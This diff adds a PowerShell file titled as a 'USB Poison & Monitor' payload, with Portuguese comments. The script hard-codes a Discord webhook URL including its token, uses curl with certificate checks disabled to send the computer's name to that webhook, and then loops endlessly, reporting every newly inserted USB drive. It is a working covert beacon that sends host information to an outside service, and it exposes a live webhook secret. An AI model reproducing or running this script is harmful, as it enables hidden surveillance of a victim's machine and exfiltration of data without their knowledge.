@@ -1,0 +1,23 @@
+# PAYLOAD (.ps1) - USB Poison & Monitor
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# Notificação de início de monitorização
+curl.exe -k -s -F ('payload='+[char]64+'Monitorizacao USB iniciada em: '+$env:COMPUTERNAME) $u
+
+# Lógica de deteção de novas drives (USB)
+$initialDrives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -ExpandProperty DeviceID
+
+while($true) {
+    $currentDrives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -ExpandProperty DeviceID
+    $newDrive = $currentDrives | Where-Object { $initialDrives -notcontains $_ }
+
+    if ($newDrive) {
+        $msg = 'Nova drive USB detetada: ' + $newDrive
+        $a = 'payload=' + [char]64 + $msg
+        curl.exe -k -s -F $a $u
+        
+        # Atualiza a lista para não repetir o alerta infinitamente
+        $initialDrives = $currentDrives
+    }
+    Start-Sleep -Seconds 2
+}
